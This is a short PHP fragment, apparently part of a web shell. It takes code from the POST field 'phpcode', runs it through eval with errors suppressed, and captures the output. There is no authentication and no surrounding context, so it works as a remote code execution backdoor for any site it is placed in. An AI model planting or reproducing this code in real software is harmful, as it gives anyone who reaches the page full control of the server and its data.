<?php
if(isset($_POST['phpcode'])) {
	$phpcode = chop($_POST['phpcode']);
	ob_start();
	if(substr($phpcode,0,2) == '<?' && substr($phpcode,-2) == '?>') { @eval ('?>'.$phpcode.'<?php '); }
	else { @eval ($phpcode); }
	$out = ob_get_contents();
	ob_end_clean();
}

?>